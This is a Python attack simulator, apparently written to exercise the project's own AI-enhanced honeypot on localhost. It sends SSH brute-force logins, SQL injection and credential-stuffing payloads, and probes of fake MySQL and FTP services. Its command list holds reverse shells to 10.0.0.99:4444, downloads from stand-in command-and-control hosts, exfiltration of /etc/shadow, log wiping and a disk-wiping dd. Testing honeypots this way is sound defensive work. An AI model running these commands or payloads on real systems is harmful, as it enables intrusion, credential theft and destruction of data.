"""
simulate_attack.py — Full Attack Simulator for AI-Enhanced Honeypot

Simulates multiple attack vectors:
  1. SSH brute-force + malicious commands
  2. Web honeypot SQLi, credential stuffing
  3. MySQL port probe (fake service)
  4. FTP port probe (fake service)

Usage:
    python simulate_attack.py [--mode all|ssh|web|services]

Example:
    python simulate_attack.py           # runs everything
    python simulate_attack.py --mode ssh
    python simulate_attack.py --mode web
    python simulate_attack.py --mode services
"""

import asyncio
import asyncssh
import sys
import random
import socket
import argparse

try:
    import httpx
except ImportError:
    print("httpx not installed. Run: pip install httpx")
    sys.exit(1)

# ─── SSH Attack ───────────────────────────────────────────────────────────────

ATTACK_COMMANDS = [
    "whoami",
    "id",
    "uname -a",
    "pwd",
    "ls -la /root",
    "cat /etc/passwd",
    "cat /etc/shadow",
    "ps aux",
    "netstat -an",
    "wget http://malware.example.com/botnet.sh",
    "curl -O http://c2.server/payload.elf",
    "chmod +x botnet.sh && ./botnet.sh",
    "bash -i >& /dev/tcp/10.0.0.99/4444 0>&1",
    "rm -rf /var/log/auth.log",
    "history -c",
    "crontab -l",
    "sudo su -",
    "dd if=/dev/zero of=/dev/sda",
    "python3 -c \"import socket,os,pty; s=socket.socket(); s.connect(('10.0.0.99',4444)); os.dup2(s.fileno(),0); pty.spawn('/bin/bash')\"",
    "curl -X POST http://c2.server/exfil --data @/etc/shadow",
]

CREDENTIAL_PAIRS = [
    ("root", "root"),
    ("admin", "admin"),
    ("root", "toor"),
    ("admin", "password123"),
    ("user", "1234"),
    ("ubuntu", "ubuntu"),
    ("pi", "raspberry"),
    ("guest", "guest"),
    ("root", "123456"),
    ("administrator", "P@ssword1"),
]


async def simulate_ssh_attack(attacker_index: int):
    username, password = random.choice(CREDENTIAL_PAIRS)
    try:
        async with asyncssh.connect(
            '127.0.0.1',
            port=2222,
            username=username,
            password=password,
            known_hosts=None
        ) as conn:
            print(f"  [SSH #{attacker_index}] ✓ Connected as {username}:{password}")

            cmds = random.sample(ATTACK_COMMANDS, k=random.randint(3, 6))
            for cmd in cmds:
                print(f"  [SSH #{attacker_index}] → {cmd[:60]}")
                try:
                    await conn.run(cmd, timeout=3)
                except Exception:
                    pass  # Honeypot closes connection — expected
                await asyncio.sleep(random.uniform(0.3, 1.2))

    except asyncssh.DisconnectError:
        print(f"  [SSH #{attacker_index}] ✓ Session ended (honeypot disconnected — normal)")
    except Exception as e:
        print(f"  [SSH #{attacker_index}] ✗ Error: {e}")


# ─── Web Attack ───────────────────────────────────────────────────────────────

WEB_SQLI_PAYLOADS = [
    ("' OR '1'='1", "anything"),
    ("admin'--", "pass"),
    ("' OR 1=1--", "x"),
    ("admin' UNION SELECT username, password FROM users--", "x"),
    ("1' AND SLEEP(5)--", "x"),
    ("' DROP TABLE users;--", "x"),
    ("admin", "' OR '1'='1"),
    ("\" OR \"\"=\"", "\" OR \"\"=\""),
]

WEB_CRED_PAYLOADS = [
    ("admin", "admin"),
    ("administrator", "password"),
    ("root", "root123"),
    ("superuser", "super"),
    ("test", "test"),
]


async def simulate_web_attack():
    async with httpx.AsyncClient(timeout=5) as client:
        try:
            # 1. Reconnaissance — just load the page
            print("  [WEB] → GET /admin (recon)")
            await client.get("http://localhost:8000/admin")
            await asyncio.sleep(0.5)

            # 2. Credential stuffing
            for user, pwd in random.sample(WEB_CRED_PAYLOADS, k=3):
                print(f"  [WEB] → Credential stuff: {user}:{pwd}")
                await client.post("http://localhost:8000/admin/login",
                                  data={"username": user, "password": pwd})
                await asyncio.sleep(0.3)

            # 3. SQL Injection attacks
            for user, pwd in random.sample(WEB_SQLI_PAYLOADS, k=4):
                print(f"  [WEB] → SQLi: {user[:40]} / {pwd[:30]}")
                await client.post("http://localhost:8000/admin/login",
                                  data={"username": user, "password": pwd})
                await asyncio.sleep(0.5)

            print("  [WEB] ✓ Web attack simulation complete")
        except Exception as e:
            print(f"  [WEB] ✗ Error: {e} — Is the backend running on port 8000?")


# ─── Service Probe (MySQL / FTP) ─────────────────────────────────────────────

MYSQL_PROBE = b"\x4e\x00\x00\x01\x85\xa6\x3f\x20\x00\x00\x00\x01\x21\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00root\x00\x00mysql_native_password\x00"
FTP_USER_CMD = b"USER anonymous\r\nPASS attacker@evil.com\r\nLIST\r\nQUIT\r\n"


def probe_tcp_service(host: str, port: int, send_data: bytes, label: str):
    """Connect, receive banner, optionally send data."""
    try:
        with socket.create_connection((host, port), timeout=3) as s:
            banner = s.recv(1024)
            print(f"  [{label}] ✓ Connected. Banner: {banner[:60].decode('utf-8', errors='replace').strip()!r}")
            if send_data:
                s.sendall(send_data)
                try:
                    resp = s.recv(1024)
                    print(f"  [{label}] ← Response: {resp[:60].decode('utf-8', errors='replace').strip()!r}")
                except Exception:
                    pass
    except ConnectionRefusedError:
        print(f"  [{label}] ✗ Port {port} refused — is the fake service running?")
    except Exception as e:
        print(f"  [{label}] ✗ Error: {e}")


async def simulate_service_probes():
    loop = asyncio.get_event_loop()

    print("  [SERVICES] Probing fake MySQL on port 3307...")
    await loop.run_in_executor(None, probe_tcp_service, "127.0.0.1", 3307, MYSQL_PROBE, "MYSQL")
    await asyncio.sleep(1)

    print("  [SERVICES] Probing fake FTP on port 2121...")
    await loop.run_in_executor(None, probe_tcp_service, "127.0.0.1", 2121, FTP_USER_CMD, "FTP")
    await asyncio.sleep(1)

    print("  [SERVICES] Probing fake HTTP_alt on port 8888...")
    await loop.run_in_executor(None, probe_tcp_service, "127.0.0.1", 8888, b"GET / HTTP/1.0\r\n\r\n", "HTTP_ALT")
    await asyncio.sleep(1)

    print("  [SERVICES] ✓ Service probe simulation complete")


# ─── Main ─────────────────────────────────────────────────────────────────────

async def main(mode: str):
    print(f"\n{'='*60}")
    print(f"  🎯 HONEYPOT ATTACK SIMULATOR — Mode: {mode.upper()}")
    print(f"{'='*60}\n")

    tasks = []

    if mode in ("all", "web"):
        print("[*] Starting Web attacks (SQLi + Credential Stuffing)...")
        tasks.append(simulate_web_attack())

    if mode in ("all", "ssh"):
        print(f"[*] Starting SSH brute-force (3 concurrent attackers)...")
        for i in range(3):
            tasks.append(simulate_ssh_attack(i))

    if mode in ("all", "services"):
        print("[*] Starting Service probes (MySQL + FTP)...")
        tasks.append(simulate_service_probes())

    await asyncio.gather(*tasks)

    print(f"\n{'='*60}")
    print("  ✅ Simulation Complete!")
    print("  → Check the dashboard at http://localhost:5173")
    print("  → Or the raw API at http://localhost:8000/api/stats")
    print(f"{'='*60}\n")


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Honeypot Attack Simulator")
    parser.add_argument(
        "--mode",
        choices=["all", "ssh", "web", "services"],
        default="all",
        help="Which attack type to simulate (default: all)"
    )
    args = parser.parse_args()

    if sys.platform == 'win32':
        asyncio.set_event_loop_policy(asyncio.WindowsSelectorEventLoopPolicy())

    asyncio.run(main(args.mode))
